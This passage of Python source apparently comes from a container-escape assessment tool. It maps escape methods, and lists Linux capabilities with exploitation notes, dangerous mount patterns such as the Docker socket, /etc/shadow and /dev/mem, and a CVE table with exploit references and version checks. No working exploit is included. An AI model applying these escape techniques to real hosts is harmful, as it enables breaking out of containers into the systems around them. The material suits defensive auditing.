        EscapeMethod.HOST_UTS.value: EscapeMethod.NAMESPACE_ESCAPE.value,
        EscapeMethod.KERNEL_MODULES.value: EscapeMethod.CAP_SYS_MODULE.value,
        EscapeMethod.EBPF_EXPLOIT.value: EscapeMethod.CAP_BPF.value,
        EscapeMethod.IO_URING.value: EscapeMethod.SYSCALL_ABUSE.value,
        EscapeMethod.PROC_KMEM.value: EscapeMethod.DEVICE_ACCESS.value,
        EscapeMethod.KALLSYMS.value: EscapeMethod.PROC_KCORE.value,
        EscapeMethod.CGROUP_NOTIFY_ON_RELEASE.value: EscapeMethod.CGROUP_RELEASE_AGENT.value,
        EscapeMethod.CGROUP_DEVICES.value: EscapeMethod.DEVICE_ACCESS.value,
        EscapeMethod.CGROUPV2_ESCAPE.value: EscapeMethod.CGROUP_RELEASE_AGENT.value,
        EscapeMethod.MKNOD_DEVICE.value: EscapeMethod.CAP_MKNOD.value,
        EscapeMethod.DEV_MEM.value: EscapeMethod.DEVICE_ACCESS.value,
        EscapeMethod.DEV_KMEM.value: EscapeMethod.DEVICE_ACCESS.value,
        EscapeMethod.DEV_PORT.value: EscapeMethod.DEVICE_ACCESS.value,
        EscapeMethod.DISK_DEVICE.value: EscapeMethod.DEVICE_ACCESS.value,
        EscapeMethod.K8S_SECRETS.value: EscapeMethod.K8S_SERVICE_ACCOUNT.value,
        EscapeMethod.K8S_CONFIGMAP.value: EscapeMethod.K8S_API_ACCESS.value,
        EscapeMethod.PTRACE_INJECTION.value: EscapeMethod.CAP_SYS_PTRACE.value,
        EscapeMethod.LD_PRELOAD.value: EscapeMethod.SENSITIVE_FILES.value,
        EscapeMethod.WEAK_TMP_MOUNT.value: EscapeMethod.HOST_MOUNT.value,
        EscapeMethod.WEAK_IMAGE_CONFIG.value: EscapeMethod.READ_ONLY_ROOTFS_DISABLED.value,
        EscapeMethod.X11_FORWARDING.value: EscapeMethod.SENSITIVE_FILES.value,
        EscapeMethod.SSH_AGENT_FORWARDING.value: EscapeMethod.SENSITIVE_FILES.value,
        EscapeMethod.DBUS_SOCKET.value: EscapeMethod.DOCKER_SOCK.value,
        EscapeMethod.DOCKER_CP_ABUSE.value: EscapeMethod.HOST_MOUNT.value,
        EscapeMethod.RUNC_EXEC.value: EscapeMethod.PRIVILEGED_CONTAINER.value,
        EscapeMethod.KATA_CONTAINERS.value: EscapeMethod.ALTERNATIVE_RUNTIME.value,
        EscapeMethod.GVISOR.value: EscapeMethod.ALTERNATIVE_RUNTIME.value,
        EscapeMethod.FIRECRACKER.value: EscapeMethod.ALTERNATIVE_RUNTIME.value,
        EscapeMethod.PID_NS_ESCAPE.value: EscapeMethod.NAMESPACE_ESCAPE.value,
        EscapeMethod.NET_NS_ESCAPE.value: EscapeMethod.HOST_NETWORK.value,
        EscapeMethod.MNT_NS_ESCAPE.value: EscapeMethod.PROC_ROOT_CHROOT.value,
        EscapeMethod.USER_NS_ESCAPE.value: EscapeMethod.NAMESPACE_ESCAPE.value,
        EscapeMethod.IPC_NS_ESCAPE.value: EscapeMethod.NAMESPACE_ESCAPE.value,
        EscapeMethod.UTS_NS_ESCAPE.value: EscapeMethod.NAMESPACE_ESCAPE.value,
        EscapeMethod.CGROUP_NS_ESCAPE.value: EscapeMethod.CGROUP_RELEASE_AGENT.value,
        EscapeMethod.DOCKER_API_EXPOSED.value: EscapeMethod.DOCKER_TCP.value,
        EscapeMethod.NETWORK_HOST_MODE.value: EscapeMethod.HOST_NETWORK.value,
        EscapeMethod.DNS_POISONING.value: EscapeMethod.ARP_SPOOFING.value,
        EscapeMethod.CONTAINER_PIVOT.value: EscapeMethod.PRIVILEGED_CONTAINER.value,
    }
    for em in EscapeMethod:
        k = em.value
        if k in ref:
            continue
        base = cve_base.get(k)
        if base and base in ref:
            ent = copy.deepcopy(ref[base])
            ent["description"] = f"{k}: {ent.get('description', '')}"
            ref[k] = ent
            continue
        if em.name.startswith("CVE_"):
            ref[k] = {
                "commands": [
                    "$ uname -r",
                    "$ cat /etc/os-release 2>/dev/null | head -n 8 || true",
                    "$ command -v runc >/dev/null && runc --version 2>&1 | head -n 5 || true",
                    "$ command -v containerd >/dev/null && containerd --version 2>&1 | head -n 3 || true",
                    "$ command -v crictl >/dev/null && crictl version 2>&1 | head -n 20 || true",
                    "$ command -v kubelet >/dev/null && kubelet --version 2>&1 | head -n 3 || true",
                    f"# {k}: compare kernel/containerd/runc/kubelet versions to vendor fix table for this CVE.",
                ],
                "description": f"{k.replace('_', '-').upper()} — affected version / patch verification",
            }
            continue
        src = alias_src.get(k)
        if src and src in ref:
            ent = copy.deepcopy(ref[src])
            ent["description"] = f"{k}: {ent.get('description', '')}"
            ref[k] = ent
            continue
        ent = copy.deepcopy(ref["default"])
        ent["description"] = f"{k}: {ent.get('description', '')}"
        ref[k] = ent


_apply_docker_escape_enum_coverage()

# Linux Capabilities Database - Complete list
CAPABILITIES_DATABASE: Dict[str, Dict[str, Any]] = {
    "CAP_SYS_ADMIN": {
        "bit": 21,
        "hex": "0x200000",
        "risk": CapabilityRisk.CRITICAL,
        "escape_methods": [
            EscapeMethod.CAP_SYS_ADMIN,
            EscapeMethod.CGROUP_RELEASE_AGENT,
            EscapeMethod.DEBUGFS_MOUNT,
            EscapeMethod.CORE_PATTERN
        ],
        "description": "Allows many system administration operations including mount, sethostname, quotactl",
        "exploitation": "Can mount host filesystem, manipulate cgroups, abuse core_pattern, mount debugfs",
        "mitre": ["T1611", "T1068"]
    },
    "CAP_SYS_PTRACE": {
        "bit": 19,
        "hex": "0x80000",
        "risk": CapabilityRisk.CRITICAL,
        "escape_methods": [EscapeMethod.CAP_SYS_PTRACE, EscapeMethod.PTRACE_INJECTION],
        "description": "Allows ptrace and process injection",
        "exploitation": "Can inject code into host processes via /proc/[pid]/mem or ptrace",
        "mitre": ["T1055", "T1611"]
    },
    "CAP_SYS_MODULE": {
        "bit": 16,
        "hex": "0x10000",
        "risk": CapabilityRisk.CRITICAL,
        "escape_methods": [EscapeMethod.CAP_SYS_MODULE, EscapeMethod.KERNEL_MODULES],
        "description": "Allows loading/unloading kernel modules",
        "exploitation": "Can load malicious kernel module for direct escape to ring-0",
        "mitre": ["T1547.006", "T1014", "T1611"]
    },
    "CAP_SYS_RAWIO": {
        "bit": 17,
        "hex": "0x20000",
        "risk": CapabilityRisk.CRITICAL,
        "escape_methods": [EscapeMethod.CAP_SYS_RAWIO, EscapeMethod.DEV_MEM, EscapeMethod.DEV_KMEM],
        "description": "Allows raw I/O operations",
        "exploitation": "Can access /dev/mem, /dev/kmem for kernel memory access and modification",
        "mitre": ["T1068", "T1003"]
    },
    "CAP_SYS_BOOT": {
        "bit": 22,
        "hex": "0x400000",
        "risk": CapabilityRisk.HIGH,
        "escape_methods": [EscapeMethod.CAP_SYS_BOOT],
        "description": "Allows reboot and kexec_load",
        "exploitation": "Can load new kernel via kexec for persistence",
        "mitre": ["T1014"]
    },
    "CAP_SYS_CHROOT": {
        "bit": 18,
        "hex": "0x40000",
        "risk": CapabilityRisk.HIGH,
        "escape_methods": [EscapeMethod.CAP_SYS_CHROOT],
        "description": "Allows use of chroot()",
        "exploitation": "Can escape chroot jails, manipulate filesystem root",
        "mitre": ["T1611"]
    },
    "CAP_NET_ADMIN": {
        "bit": 12,
        "hex": "0x1000",
        "risk": CapabilityRisk.HIGH,
        "escape_methods": [
            EscapeMethod.CAP_NET_ADMIN,
            EscapeMethod.IPTABLES_ACCESS,
            EscapeMethod.ARP_SPOOFING
        ],
        "description": "Allows network administration",
        "exploitation": "Can manipulate iptables, create network namespaces, MITM attacks, ARP spoofing",
        "mitre": ["T1557", "T1040", "T1562"]
    },
    "CAP_NET_RAW": {
        "bit": 13,
        "hex": "0x2000",
        "risk": CapabilityRisk.HIGH,
        "escape_methods": [EscapeMethod.CAP_NET_RAW, EscapeMethod.ARP_SPOOFING],
        "description": "Allows raw socket access",
        "exploitation": "Can sniff network traffic, craft arbitrary packets, ARP/DNS spoofing",
        "mitre": ["T1040", "T1557"]
    },
    "CAP_DAC_OVERRIDE": {
        "bit": 1,
        "hex": "0x2",
        "risk": CapabilityRisk.HIGH,
        "escape_methods": [EscapeMethod.CAP_DAC_OVERRIDE],
        "description": "Bypass file read/write/execute permission checks",
        "exploitation": "Can read/write any file in container, potential escape via /proc",
        "mitre": ["T1068", "T1083"]
    },
    "CAP_DAC_READ_SEARCH": {
        "bit": 2,
        "hex": "0x4",
        "risk": CapabilityRisk.MEDIUM,
        "escape_methods": [EscapeMethod.CAP_DAC_READ_SEARCH],
        "description": "Bypass file read permission checks",
        "exploitation": "Can read any file in container including secrets",
        "mitre": ["T1083", "T1552"]
    },
    "CAP_MKNOD": {
        "bit": 27,
        "hex": "0x8000000",
        "risk": CapabilityRisk.HIGH,
        "escape_methods": [EscapeMethod.CAP_MKNOD, EscapeMethod.MKNOD_DEVICE],
        "description": "Allows creation of special files",
        "exploitation": "Can create device nodes for disk access (/dev/sda)",
        "mitre": ["T1068"]
    },
    "CAP_SETUID": {
        "bit": 7,
        "hex": "0x80",
        "risk": CapabilityRisk.MEDIUM,
        "escape_methods": [EscapeMethod.CAP_SETUID],
        "description": "Allows setuid operations",
        "exploitation": "Privilege escalation within container",
        "mitre": ["T1548"]
    },
    "CAP_SETGID": {
        "bit": 6,
        "hex": "0x40",
        "risk": CapabilityRisk.MEDIUM,
        "escape_methods": [EscapeMethod.CAP_SETGID],
        "description": "Allows setgid operations",
        "exploitation": "Privilege escalation within container",
        "mitre": ["T1548"]
    },
    "CAP_SETFCAP": {
        "bit": 31,
        "hex": "0x80000000",
        "risk": CapabilityRisk.HIGH,
        "escape_methods": [EscapeMethod.CAP_SETFCAP],
        "description": "Allows setting file capabilities",
        "exploitation": "Can set capabilities on files for persistence/escalation",
        "mitre": ["T1548"]
    },
    "CAP_FOWNER": {
        "bit": 3,
        "hex": "0x8",
        "risk": CapabilityRisk.MEDIUM,
        "escape_methods": [EscapeMethod.CAP_FOWNER],
        "description": "Bypass file ownership checks",
        "exploitation": "Can modify ownership of any file",
        "mitre": ["T1222"]
    },
    "CAP_AUDIT_WRITE": {
        "bit": 29,
        "hex": "0x20000000",
        "risk": CapabilityRisk.MEDIUM,
        "escape_methods": [EscapeMethod.CAP_AUDIT_WRITE],
        "description": "Write to kernel audit log",
        "exploitation": "Can write arbitrary audit messages, tamper with logs",
        "mitre": ["T1562"]
    },
    "CAP_BPF": {
        "bit": 39,
        "hex": "0x8000000000",
        "risk": CapabilityRisk.CRITICAL,
        "escape_methods": [EscapeMethod.CAP_BPF, EscapeMethod.EBPF_EXPLOIT],
        "description": "Allows BPF operations (kernel 5.8+)",
        "exploitation": "Can load eBPF programs for kernel exploitation",
        "mitre": ["T1068", "T1611"]
    },
    "CAP_PERFMON": {
        "bit": 38,
        "hex": "0x4000000000",
        "risk": CapabilityRisk.HIGH,
        "escape_methods": [EscapeMethod.CAP_PERFMON],
        "description": "Allows performance monitoring",
        "exploitation": "Can access perf_event for information disclosure",
        "mitre": ["T1003"]
    },
    "CAP_SYS_RESOURCE": {
        "bit": 24,
        "hex": "0x1000000",
        "risk": CapabilityRisk.MEDIUM,
        "escape_methods": [EscapeMethod.CAP_SYS_RESOURCE],
        "description": "Override resource limits",
        "exploitation": "Can exhaust system resources, bypass limits",
        "mitre": ["T1499"]
    },
}

# Dangerous mount patterns
DANGEROUS_MOUNTS: List[Dict[str, Any]] = [
    # Sockets
    {"pattern": "/var/run/docker.sock", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.DOCKER_SOCK},
    {"pattern": "/run/docker.sock", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.DOCKER_SOCK},
    {"pattern": "/var/run/containerd", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.CONTAINERD_SOCK},
    {"pattern": "/run/containerd", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.CONTAINERD_SOCK},
    {"pattern": "/var/run/crio", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.CRIO_SOCK},
    {"pattern": "/run/podman", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.PODMAN_SOCK},
    
    # Host filesystem
    {"pattern": "/:/", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.HOST_MOUNT},
    {"pattern": "/host", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.HOST_MOUNT},
    {"pattern": "/rootfs", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.HOST_MOUNT},
    {"pattern": "/mnt/host", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.HOST_MOUNT},
    
    # Sensitive files
    {"pattern": "/etc/shadow", "risk": SeverityLevel.HIGH, "method": EscapeMethod.SENSITIVE_FILES},
    {"pattern": "/etc/passwd", "risk": SeverityLevel.MEDIUM, "method": EscapeMethod.SENSITIVE_FILES},
    {"pattern": "/root/.ssh", "risk": SeverityLevel.HIGH, "method": EscapeMethod.SENSITIVE_FILES},
    {"pattern": "/home", "risk": SeverityLevel.MEDIUM, "method": EscapeMethod.SENSITIVE_FILES},
    
    # Docker internals
    {"pattern": "/var/lib/docker", "risk": SeverityLevel.HIGH, "method": EscapeMethod.DOCKER_FILESYSTEM},
    {"pattern": "/var/lib/containerd", "risk": SeverityLevel.HIGH, "method": EscapeMethod.DOCKER_FILESYSTEM},
    
    # Kernel interfaces
    {"pattern": "/proc/sys", "risk": SeverityLevel.HIGH, "method": EscapeMethod.PROCFS_WRITE},
    {"pattern": "/sys/kernel", "risk": SeverityLevel.HIGH, "method": EscapeMethod.SYSFS_WRITE},
    {"pattern": "/sys/fs/cgroup", "risk": SeverityLevel.HIGH, "method": EscapeMethod.CGROUP_RELEASE_AGENT},
    
    # Devices
    {"pattern": "/dev/sda", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.DISK_DEVICE},
    {"pattern": "/dev/nvme", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.DISK_DEVICE},
    {"pattern": "/dev/mem", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.DEV_MEM},
    {"pattern": "/dev/kmem", "risk": SeverityLevel.CRITICAL, "method": EscapeMethod.DEV_KMEM},
    
    # Misc
    {"pattern": "/var/run/dbus", "risk": SeverityLevel.MEDIUM, "method": EscapeMethod.DBUS_SOCKET},
    {"pattern": "/tmp/.X11", "risk": SeverityLevel.MEDIUM, "method": EscapeMethod.X11_FORWARDING},
]

# CVE Database - Complete with 20+ CVEs
CVE_DATABASE: Dict[str, Dict[str, Any]] = {
    # =========================================================================
    # Container Runtime CVEs - Critical
    # =========================================================================
    "CVE-2019-5736": {
        "cvss": 8.6,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.RUNC, ContainerRuntime.DOCKER, ContainerRuntime.CONTAINERD],
        "affected_versions": ["runc < 1.0.0-rc6", "docker < 18.09.2"],
        "fixed_versions": ["runc >= 1.0.0-rc6", "docker >= 18.09.2"],
        "description": "runc container breakout via /proc/self/exe overwrite during exec",
        "public_exploit": True,
        "exploit_url": "https://github.com/Frichetten/CVE-2019-5736-PoC",
        "metasploit": "exploit/linux/local/docker_runc_escape",
        "requires_privileged": False,
        "requires_root": False,
        "reliability": 0.85,
        "mitre_techniques": ["T1611", "T1068"],
        "check_binaries": ["/usr/bin/runc", "/usr/sbin/runc", "/usr/local/bin/runc"],
        "detection_method": "Check runc version and /proc/self/exe access",
        "exploitation_notes": "Requires docker exec into container. Overwrites runc binary on host.",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2019-5736",
            "https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html"
        ]
    },
    "CVE-2024-21626": {
        "cvss": 8.6,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.RUNC],
        "affected_versions": ["runc < 1.1.12"],
        "fixed_versions": ["runc >= 1.1.12"],
        "description": "runc file descriptor leak allows container escape via /proc/self/fd",
        "public_exploit": True,
        "exploit_url": "https://github.com/snyk/leaky-vessels-dynamic-detector",
        "requires_privileged": False,
        "reliability": 0.90,
        "mitre_techniques": ["T1611"],
        "detection_method": "Check runc version and fd access",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-21626"]
    },
    
    # =========================================================================
    # New CVEs 2024-2025
    # =========================================================================
    "CVE-2024-23651": {
        "cvss": 8.7,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.DOCKER, ContainerRuntime.CONTAINERD],
        "affected_versions": ["BuildKit < 0.12.5"],
        "fixed_versions": ["BuildKit >= 0.12.5"],
        "description": "BuildKit race condition in cache mounts allows container escape",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.70,
        "mitre_techniques": ["T1611", "T1068"],
        "detection_method": "Check BuildKit version",
        "exploitation_notes": "Race condition during cache mount operations allows writing to host filesystem",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-23651"]
    },
    "CVE-2024-23652": {
        "cvss": 9.1,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.DOCKER, ContainerRuntime.CONTAINERD],
        "affected_versions": ["BuildKit < 0.12.5"],
        "fixed_versions": ["BuildKit >= 0.12.5"],
        "description": "BuildKit arbitrary file deletion on host via malicious Dockerfile",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.85,
        "mitre_techniques": ["T1611", "T1485"],
        "detection_method": "Check BuildKit version",
        "exploitation_notes": "Malicious Dockerfile can delete arbitrary files on host during build",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-23652"]
    },
    "CVE-2024-23653": {
        "cvss": 9.8,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.DOCKER, ContainerRuntime.CONTAINERD],
        "affected_versions": ["BuildKit < 0.12.5"],
        "fixed_versions": ["BuildKit >= 0.12.5"],
        "description": "BuildKit GRPC SecurityMode allows container escape via privileged execution",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.90,
        "mitre_techniques": ["T1611", "T1068"],
        "detection_method": "Check BuildKit version and GRPC configuration",
        "exploitation_notes": "GRPC SecurityMode bypass allows executing privileged operations",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-23653"]
    },
    "CVE-2024-0132": {
        "cvss": 9.0,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.DOCKER, ContainerRuntime.CONTAINERD, ContainerRuntime.PODMAN],
        "affected_versions": ["NVIDIA Container Toolkit < 1.16.2", "NVIDIA GPU Operator < 24.6.2"],
        "fixed_versions": ["NVIDIA Container Toolkit >= 1.16.2", "NVIDIA GPU Operator >= 24.6.2"],
        "description": "NVIDIA Container Toolkit TOCTOU vulnerability allows container escape",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.85,
        "mitre_techniques": ["T1611", "T1068"],
        "detection_method": "Check NVIDIA Container Toolkit version and GPU access",
        "exploitation_notes": "Time-of-check to time-of-use race allows modifying host filesystem via GPU device access",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-0132"]
    },
    "CVE-2024-3154": {
        "cvss": 8.6,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.CRIO],
        "affected_versions": ["CRI-O < 1.29.4", "CRI-O < 1.28.6", "CRI-O < 1.27.6"],
        "fixed_versions": ["CRI-O >= 1.29.4", "CRI-O >= 1.28.6", "CRI-O >= 1.27.6"],
        "description": "CRI-O allows arbitrary container commands execution on host",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.80,
        "mitre_techniques": ["T1611", "T1059"],
        "detection_method": "Check CRI-O version",
        "exploitation_notes": "Attacker can execute arbitrary commands by creating malicious pod",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-3154"]
    },
    "CVE-2024-41110": {
        "cvss": 9.9,
        "type": VulnerabilityType.PRIVILEGE_ESCALATION,
        "runtimes": [ContainerRuntime.DOCKER],
        "affected_versions": ["Docker Engine < 27.1.1", "< 26.1.4", "< 25.0.6", "< 23.0.15"],
        "fixed_versions": ["Docker Engine >= 27.1.1", ">= 26.1.4", ">= 25.0.6", ">= 23.0.15"],
        "description": "Docker Engine AuthZ plugin bypass allows unauthorized actions",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.95,
        "mitre_techniques": ["T1068", "T1078"],
        "detection_method": "Check Docker Engine version and AuthZ plugin configuration",
        "exploitation_notes": "Content-Length=0 requests bypass authorization plugins",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-41110"]
    },
    "CVE-2024-45310": {
        "cvss": 7.5,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.RUNC],
        "affected_versions": ["runc < 1.1.14"],
        "fixed_versions": ["runc >= 1.1.14"],
        "description": "runc symlink-exchange attack allows host filesystem modification",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.75,
        "mitre_techniques": ["T1611", "T1068"],
        "detection_method": "Check runc version",
        "exploitation_notes": "Symlink-exchange attack during container setup",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-45310"]
    },
    "CVE-2025-21607": {
        "cvss": 7.0,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.CONTAINERD],
        "affected_versions": ["containerd < 1.7.25", "containerd < 2.0.2"],
        "fixed_versions": ["containerd >= 1.7.25", "containerd >= 2.0.2"],
        "description": "containerd credential leak via malicious registry",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.80,
        "mitre_techniques": ["T1552", "T1078"],
        "detection_method": "Check containerd version",
        "exploitation_notes": "Malicious registry can extract credentials during image pull",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-21607"]
    },
    
    # =========================================================================
    # New CVEs Late 2024 - 2025
    # =========================================================================
    "CVE-2024-32000": {
        "cvss": 6.5,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.DOCKER],
        "affected_versions": ["Docker Desktop < 4.30.0"],
        "fixed_versions": ["Docker Desktop >= 4.30.0"],
        "description": "Docker Desktop arbitrary file write via symlink during update",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.70,
        "mitre_techniques": ["T1611", "T1068"],
        "detection_method": "Check Docker Desktop version",
        "exploitation_notes": "Local privilege escalation via update mechanism",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-32000"]
    },
    "CVE-2024-24557": {
        "cvss": 7.0,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.DOCKER],
        "affected_versions": ["Docker Engine < 25.0.2"],
        "fixed_versions": ["Docker Engine >= 25.0.2"],
        "description": "Docker Engine classic builder cache poisoning allows RCE",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.75,
        "mitre_techniques": ["T1195.002", "T1059"],
        "detection_method": "Check Docker Engine version and builder cache",
        "exploitation_notes": "Cache poisoning during image build allows code execution",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-24557"]
    },
    "CVE-2024-1753": {
        "cvss": 8.6,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.PODMAN],
        "affected_versions": ["Podman < 4.9.4", "Buildah < 1.35.4"],
        "fixed_versions": ["Podman >= 4.9.4", "Buildah >= 1.35.4"],
        "description": "Podman/Buildah full container escape via build instructions",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.90,
        "mitre_techniques": ["T1611", "T1068"],
        "detection_method": "Check Podman/Buildah version",
        "exploitation_notes": "Malicious Containerfile/Dockerfile allows host filesystem access during build",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-1753"]
    },
    "CVE-2024-29018": {
        "cvss": 5.9,
        "type": VulnerabilityType.INFORMATION_DISCLOSURE,
        "runtimes": [ContainerRuntime.DOCKER],
        "affected_versions": ["Docker Engine < 26.0.0"],
        "fixed_versions": ["Docker Engine >= 26.0.0"],
        "description": "Docker Engine external DNS requests leak internal resolver queries",
        "public_exploit": False,
        "requires_privileged": False,
        "reliability": 0.60,
        "mitre_techniques": ["T1046", "T1040"],
        "detection_method": "Check Docker Engine version and DNS configuration",
        "exploitation_notes": "DNS queries from containers may be observable externally",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-29018"]
    },
    "CVE-2024-9341": {
        "cvss": 7.4,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.PODMAN, ContainerRuntime.CRIO],
        "affected_versions": ["containers/common < 0.60.4"],
        "fixed_versions": ["containers/common >= 0.60.4"],
        "description": "containers/common FIPS mode bypass allows unauthorized image modifications",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.70,
        "mitre_techniques": ["T1562", "T1195"],
        "detection_method": "Check containers/common version in Podman/CRI-O",
        "exploitation_notes": "FIPS mode bypass allows tampering with signed images",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-9341"]
    },
    "CVE-2024-9407": {
        "cvss": 4.7,
        "type": VulnerabilityType.INFORMATION_DISCLOSURE,
        "runtimes": [ContainerRuntime.PODMAN, ContainerRuntime.CRIO, ContainerRuntime.DOCKER],
        "affected_versions": ["containers/image < 5.32.2"],
        "fixed_versions": ["containers/image >= 5.32.2"],
        "description": "Insufficient manifest validation allows image digest spoofing",
        "public_exploit": False,
        "requires_privileged": False,
        "reliability": 0.50,
        "mitre_techniques": ["T1195.002"],
        "detection_method": "Check containers/image version",
        "exploitation_notes": "Allows supply chain attacks via spoofed image digests",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-9407"]
    },
    
    "CVE-2020-15257": {
        "cvss": 5.2,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.CONTAINERD],
        "affected_versions": ["containerd < 1.3.9", "containerd 1.4.x < 1.4.3"],
        "fixed_versions": ["containerd >= 1.3.9", "containerd >= 1.4.3"],
        "description": "containerd-shim API exposed to host network containers",
        "public_exploit": True,
        "requires_privileged": False,
        "requires_host_network": True,
        "reliability": 0.80,
        "mitre_techniques": ["T1611"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2020-15257"]
    },
    "CVE-2019-14271": {
        "cvss": 9.8,
        "type": VulnerabilityType.CODE_EXECUTION,
        "runtimes": [ContainerRuntime.DOCKER],
        "affected_versions": ["docker < 19.03.1"],
        "fixed_versions": ["docker >= 19.03.1"],
        "description": "docker cp command allows code execution via symlink race",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.70,
        "mitre_techniques": ["T1068", "T1059"],
        "detection_method": "Check docker version",
        "exploitation_notes": "Requires user to run 'docker cp' from container",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-14271"]
    },
    "CVE-2019-16884": {
        "cvss": 7.5,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.RUNC],
        "affected_versions": ["runc < 1.0.0-rc9"],
        "fixed_versions": ["runc >= 1.0.0-rc9"],
        "description": "AppArmor restriction bypass via malicious image",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.75,
        "mitre_techniques": ["T1611", "T1562"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-16884"]
    },
    "CVE-2021-30465": {
        "cvss": 8.5,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.RUNC],
        "affected_versions": ["runc < 1.0.0-rc95"],
        "fixed_versions": ["runc >= 1.0.0-rc95"],
        "description": "runc symlink race during container filesystem setup",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.60,
        "mitre_techniques": ["T1611", "T1068"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-30465"]
    },
    "CVE-2021-41091": {
        "cvss": 6.3,
        "type": VulnerabilityType.PRIVILEGE_ESCALATION,
        "runtimes": [ContainerRuntime.DOCKER],
        "affected_versions": ["docker < 20.10.9"],
        "fixed_versions": ["docker >= 20.10.9"],
        "description": "Moby data directory traversal allows file access on host",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.85,
        "mitre_techniques": ["T1068", "T1083"],
        "check_paths": ["/var/lib/docker/overlay2"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-41091"]
    },
    "CVE-2022-23648": {
        "cvss": 7.8,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.CONTAINERD],
        "affected_versions": ["containerd < 1.4.13", "containerd < 1.5.10", "containerd < 1.6.1"],
        "fixed_versions": ["containerd >= 1.4.13", "containerd >= 1.5.10", "containerd >= 1.6.1"],
        "description": "containerd CRI plugin allows host filesystem access via image config",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.75,
        "mitre_techniques": ["T1611"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-23648"]
    },
    "CVE-2022-24769": {
        "cvss": 5.9,
        "type": VulnerabilityType.PRIVILEGE_ESCALATION,
        "runtimes": [ContainerRuntime.DOCKER],
        "affected_versions": ["docker < 20.10.14"],
        "fixed_versions": ["docker >= 20.10.14"],
        "description": "Moby supplementary group permissions not properly set",
        "public_exploit": False,
        "requires_privileged": False,
        "reliability": 0.70,
        "mitre_techniques": ["T1068"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-24769"]
    },
    "CVE-2023-25809": {
        "cvss": 6.3,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.RUNC],
        "affected_versions": ["runc < 1.1.5"],
        "fixed_versions": ["runc >= 1.1.5"],
        "description": "runc rootless container escape via /sys/fs/cgroup",
